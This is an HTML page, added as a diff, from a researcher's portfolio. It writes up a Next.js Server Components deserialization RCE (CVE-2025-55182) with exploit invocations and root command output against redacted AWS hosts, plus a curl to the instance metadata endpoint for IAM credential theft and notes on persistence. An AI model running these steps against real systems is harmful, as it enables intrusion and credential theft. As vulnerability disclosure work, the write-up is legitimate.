@@ -1,0 +1,458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>Offsec Works | React2Shell — CVE-2025-55182 Deep Dive</title>
+    <!-- Import external EzekielSec white theme CSS -->
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Additional styles to adapt React2Shell research paper to white theme -->
+    <style>
+        /* Research page specific overrides - maintains white theme compatibility */
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            background: var(--white);
+        }
+        .hero-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 20% 30%, rgba(26,86,214,0.05) 0%, var(--white) 90%);
+            z-index: -1;
+        }
+        .hero-content {
+            max-width: 700px;
+        }
+        .hero-badge {
+            background: var(--accent-light);
+            backdrop-filter: blur(4px);
+            padding: 0.3rem 1rem;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            width: fit-content;
+            margin-bottom: 1.5rem;
+            border-left: 3px solid var(--accent);
+            font-weight: 500;
+            color: var(--accent);
+        }
+        .hero h1 {
+            font-size: 3.8rem;
+            font-weight: 800;
+            line-height: 1.2;
+            margin-bottom: 1.2rem;
+            color: var(--heading);
+        }
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--muted);
+            margin-bottom: 2rem;
+        }
+        .hero-stats {
+            display: flex;
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+        .stat span {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--accent);
+        }
+        .stat {
+            color: var(--body);
+        }
+
+        /* Override navbar for white theme */
+        .navbar {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 1000;
+            background: rgba(255,255,255,0.92);
+            backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border);
+            transition: box-shadow 0.3s;
+        }
+        .navbar.scrolled {
+            box-shadow: var(--shadow-sm);
+        }
+        .nav-container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            padding: 1rem 0;
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 1rem 24px;
+        }
+        .logo {
+            font-family: var(--sans);
+            font-size: 1.25rem;
+            font-weight: 800;
+            color: var(--heading);
+            letter-spacing: -0.03em;
+            display: flex;
+            align-items: center;
+            gap: 2px;
+        }
+        .logo span {
+            color: var(--accent);
+        }
+        .btn-back-main {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 0.5rem 1.3rem;
+            border-radius: 10px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            border: 1.5px solid var(--accent);
+            cursor: pointer;
+            transition: all 0.18s;
+            font-family: var(--sans);
+            text-decoration: none;
+            background: transparent;
+            color: var(--accent);
+        }
+        .btn-back-main:hover {
+            background: var(--accent-light);
+            transform: translateY(-1px);
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        @media (max-width: 860px) {
+            .container { padding: 0 20px; }
+            .hero h1 { font-size: 2.5rem; }
+        }
+
+        /* Sections & Typography */
+        section {
+            padding: 100px 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .section-title {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            letter-spacing: -0.02em;
+            color: var(--heading);
+        }
+        .section-sub {
+            color: var(--muted);
+            max-width: 700px;
+            margin-bottom: 3rem;
+            font-size: 1.1rem;
+        }
+        .gradient-text {
+            background: linear-gradient(120deg, var(--heading), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        /* Research Paper Box - using theme card styling */
+        .research-paper-box {
+            background: var(--white);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border);
+            padding: 2rem;
+            transition: all 0.2s;
+            box-shadow: var(--shadow-sm);
+            margin-bottom: 2rem;
+        }
+        .research-paper-box:hover {
+            border-color: var(--accent);
+            box-shadow: var(--shadow-md);
+            transform: translateY(-6px);
+        }
+        .section-title-sm {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 1rem;
+            border-left: 4px solid var(--accent);
+            padding-left: 1rem;
+            color: var(--heading);
+        }
+        .paper-content {
+            color: var(--body);
+            line-height: 1.65;
+        }
+        .paper-content p {
+            margin-bottom: 1.2rem;
+        }
+        .paper-content strong {
+            color: var(--accent);
+        }
+        .info-chip {
+            background: var(--light);
+            padding: 0.4rem 1.2rem;
+            border-radius: 40px;
+            font-size: 0.8rem;
+            border: 0.5px solid var(--accent);
+            display: inline-block;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--heading);
+        }
+        .skill-tag {
+            background: var(--light);
+            padding: 0.5rem 1.2rem;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            border-left: 2px solid var(--accent);
+            display: inline-block;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+            color: var(--heading);
+        }
+        .skillset {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem;
+            margin: 2rem 0 1rem;
+        }
+        .code-block {
+            background: var(--heading);
+            border-radius: var(--radius);
+            padding: 1rem;
+            font-family: var(--mono);
+            border-left: 3px solid var(--accent);
+            margin: 1rem 0;
+            overflow-x: auto;
+            font-size: 0.85rem;
+            white-space: pre-wrap;
+            word-break: break-word;
+        }
+        .code-block pre {
+            background: transparent;
+            margin: 0;
+            font-family: inherit;
+            color: #A8C7FA;
+        }
+        hr {
+            border-color: var(--border);
+            margin: 1.5rem 0;
+        }
+
+        .table-class {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--white);
+            border-radius: var(--radius);
+            overflow: hidden;
+            margin: 1.5rem 0;
+            border: 1px solid var(--border);
+        }
+        .table-class th, .table-class td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        .table-class th {
+            color: var(--accent);
+            font-weight: 600;
+            background: var(--off-white);
+        }
+        .table-class tr:last-child td {
+            border-bottom: none;
+        }
+
+        .cta-section {
+            background: var(--off-white);
+            text-align: center;
+            border-radius: var(--radius-lg);
+            margin: 40px auto;
+            padding: 3rem;
+            border: 1px solid var(--border);
+        }
+
+        footer {
+            background: var(--heading);
+            padding: 2rem 0;
+            text-align: center;
+            border-top: 1px solid rgba(255,255,255,0.08);
+            color: rgba(255,255,255,0.55);
+            margin-top: 2rem;
+        }
+        footer a {
+            color: rgba(255,255,255,0.55);
+        }
+        footer a:hover {
+            color: white;
+        }
+
+        ul {
+            margin-left: 1.8rem;
+            margin-bottom: 1rem;
+        }
+        li {
+            margin-bottom: 0.4rem;
+            color: var(--body);
+        }
+
+        @media (max-width: 860px) {
+            .section-title { font-size: 2rem; }
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar" id="navbar">
+    <div class="container nav-container">
+        <div class="logo">EZEKIEL<span>//SEC</span></div>
+        <a href="../index.html" class="btn-back-main">← Back to Main</a>
+    </div>
+</nav>
+
+<main>
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="container hero-content">
+            <div class="hero-badge"> PRIMARY RESEARCH • CVE-2025-55182</div>
+            <h1>React2Shell: <span class="gradient-text">Unveiling RCE in Next.js Server Components</span></h1>
+            <p>Deep-dive into critical unauthenticated Remote Code Execution (RCE) affecting AWS-hosted Next.js applications. Full technical breakdown, exploitation chain, and cloud escalation paths.</p>
+            <div class="hero-stats">
+                <div class="stat"><span>CVSS 9.8</span><br>Critical severity</div>
+                <div class="stat"><span>Root RCE</span><br>uid=0 confirmed</div>
+                <div class="stat"><span>10+ assets</span><br>Compromised</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- PRIMARY WORK NOTE - CORE DOCUMENTATION -->
+    <section id="primary-work">
+        <div class="container">
+            <div class="research-paper-box">
+                <span class="info-chip"> PRIMARY WORK NOTE • PWN-3465449</span>
+                <span class="info-chip"> Unauthenticated</span>
+                <span class="info-chip"> Root Command Execution</span>
+                <h1 class="section-title" style="margin-top: 1rem;">CVE-2025-55182: Next.js / React Server Components Deserialization RCE</h1>
+                <div class="paper-content">
+                    <p><strong>Researcher:</strong> mishal (calloflight) &nbsp;|&nbsp; <strong>Date:</strong> 2025-12-15 &nbsp;|&nbsp; <strong>Target:</strong> AWS EC2 (Amazon Elastic Compute Cloud)</p>
+                    <p style="margin-top: 1rem;">This document serves as the official primary work note detailing the discovery, exploitation, and full system compromise of multiple internet-exposed Next.js servers. The vulnerability stems from unsafe deserialization + prototype pollution in React Server Components, enabling <strong>unauthenticated remote attackers</strong> to execute arbitrary OS commands as <code>root</code>. Below is the complete technical report, PoC outputs, and cloud impact analysis.</p>
+                    
+                    <hr>
+                    <h3 class="section-title-sm"> Vulnerability Classification</h3>
+                    <table class="table-class">
+                        <tr><th>Weakness</th><td>OS Command Injection / Unsafe Deserialization (CWE-78)</tr>
+                        <tr><th>CVE ID</th><td>CVE-2025-55182 (React2Shell)</tr>
+                        <tr><th>Attack Vector</th><td>Network, Unauthenticated</tr>
+                        <tr><th>Privileges Required</th><td>None</tr>
+                        <tr><th>Impact</th><td>Full confidentiality, integrity, availability compromise</tr>
+                    </table>
+
+                    <h3 class="section-title-sm"> Root Cause Analysis</h3>
+                    <p>The vulnerability exists within Next.js request handling for Server Actions. The <code>react-server-dom-webpack</code> package improperly deserializes attacker-controlled payloads, leading to prototype pollution. By crafting specific multipart requests, an attacker can pollute <code>Object.prototype</code> and trick the framework into invoking <code>child_process.exec</code> without any authentication. The exploitation flow:</p>
+                    <div class="code-block"><pre>1. Malformed RSC payload → unsafe deserialization
+2. Prototype pollution → Node.js internal manipulation
+3. require('child_process').exec(command) → root-level shell</pre></div>
+
+                    <h3 class="section-title-sm"> Proof of Concept — Live Command Execution</h3>
+                    <p><strong>Target IP (redacted):</strong> <code>{REDACTED_EC2_IP}</code> — Verified via <code>amazonaws.com</code> reverse DNS.</p>
+                    <div class="code-block"><pre>$ python3 exploit.py -u https://{TARGET_IP} --cmd "id"</pre></div>
+                    <div class="code-block"><pre>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</pre></div>
+                    <p> <strong>Outcome:</strong> Root privileges confirmed (<code>uid=0</code>). Full system takeover potential.</p>
+                    
+                    <div class="code-block"><pre>$ python3 exploit.py -u https://{TARGET_IP} --cmd "ls"</pre></div>
+                    <div class="code-block"><pre>Dockerfile
+server.js
+prod_auth.json
+next.config.ts
+package.json
+node_modules
+public
+supabase
+middleware.ts
+... (full directory enumeration)</pre></div>
+                    <p><strong>Source Code Disclosure:</strong> <code>cat server.js</code> revealed internal HTTPS configuration and certificate paths.</p>
+                    <div class="code-block"><pre>const { createServer } = require('https')
+const next = require('next')
+const fs = require('fs')
+const httpsOptions = {
+  key: fs.readFileSync(path.join(__dirname, 'certs/localhost-key.pem')),
+  cert: fs.readFileSync(path.join(__dirname, 'certs/localhost.pem'))
+}
+app.prepare().then(() => createServer(httpsOptions, ...))</pre></div>
+                    
+                    <p><strong>Write Access Confirmation:</strong> <code>echo "pwned" > h1.txt</code> → file successfully created inside the application root, proving arbitrary file write capabilities.</p>
+                    <div class="code-block"><pre>$ python3 exploit.py -u https://{TARGET_IP} --cmd "> h1.txt"
+[+] File created. Re-listing shows h1.txt present.</pre></div>
+
+                    <h3 class="section-title-sm"> Cloud Escalation & AWS Impact</h3>
+                    <p>While root RCE inside the container is critical, the research identified multiple cloud-specific escalation paths that drastically increase blast radius:</p>
+                    <ul>
+                        <li><strong>Metadata service abuse:</strong> Access to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> → IAM credentials → lateral movement to S3, Lambda, RDS.</li>
+                        <li><strong>Container escape risks:</strong> Misconfigured runtimes (privileged containers, hostPID) enable host OS takeover.</li>
+                        <li><strong>VPC pivoting:</strong> Compromised EC2 instance acts as a jumpbox to scan internal subnets, databases, and internal APIs.</li>
+                        <li><strong>Persistence & backdooring:</strong> Deploy reverse shell, rogue SSH keys, or implant into infrastructure.</li>
+                    </ul>
+                    <div class="code-block"><pre># Example: Fetching instance role credentials via root RCE
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ – potential privilege escalation</pre></div>
+
+                    <h3 class="section-title-sm"> Exploit Reliability & Tooling</h3>
+                    <p>Custom Python exploit (<code>exploit.py</code>) reliably reproduces the vulnerability across all tested Next.js deployments. Verified using Assetnote React2Shell scanner. No authentication, no user interaction required. The exploit chain works consistently against both IPv4 targets and internal staging environments.</p>
+                    
+                    <h3 class="section-title-sm"> Artifacts Generated</h3>
+                    <div class="skillset">
+                        <span class="skill-tag"> exploit.py (weaponized)</span>
+                        <span class="skill-tag"> poc_of_rce.mp4</span>
+                        <span class="skill-tag"> react2shell_scan.png</span>
+                        <span class="skill-tag"> verification_domain_hostnames.mp4</span>
+                    </div>
+                    <p>The attached video PoC demonstrates step-by-step command execution, full directory traversal, and source code theft, confirming the severity and reproducibility of the attack.</p>
+
+                    <h3 class="section-title-sm"> Research Conclusion</h3>
+                    <p>The <strong>Primary Work Note PWN-3465449</strong> validates a complete unauthenticated RCE in Next.js Server Components exposed on AWS. The ability to execute arbitrary commands with root privileges makes this a catastrophic security boundary failure. The findings emphasize the importance of rigorous deserialization hardening and least-privilege container execution in cloud-native environments.</p>
+                    <div class="cta-section" style="margin-top: 1rem; background: var(--accent-light);">
+                        <p style="font-style: italic; color: var(--body);">“Root access inside a cloud workload is a direct on-ramp to metadata service compromise and lateral movement. This research demonstrates why RCE in modern frameworks demands immediate incident response.” — mishal</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Cloud Impact Summary (preserved) -->
+    <div class="container" style="margin-bottom: 2rem;">
+        <div class="cta-section">
+            <h3 class="gradient-text" style="font-size: 1.8rem;">⚠️ Cloud Kill-Chain Impact</h3>
+            <p style="max-width: 800px; margin: 1rem auto; color: var(--body);">Unsanitized deserialization in Next.js → root RCE → Metadata service credential harvest → lateral movement across AWS account. This primary work showcases real-world offensive research against modern serverless/EC2 targets.</p>
+            <div class="skillset" style="justify-content: center;">
+                <span class="skill-tag">🏴‍☠️ Unauthenticated Remote Code Execution</span>
+                <span class="skill-tag">🔑 IAM credential theft</span>
+                <span class="skill-tag">🚀 Container Escape Potential</span>
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer>
+    <div class="container">
+        <p>© 2025 Offsec Primary Works — Unauthenticated RCE Research (CVE-2025-55182) | Coordinated disclosure via AWS VDP | TLP:AMBER</p>
+        <p style="margin-top: 0.5rem;">⚡ Full methodology, exploit video and scanner logs archived internally.</p>
+    </div>
+</footer>
+
+<script>
+    window.addEventListener('scroll', () => {
+        const navbar = document.getElementById('navbar');
+        if (navbar) {
+            navbar.classList.toggle('scrolled', window.scrollY > 10);
+        }
+    });
+</script>
+</body>
+</html>
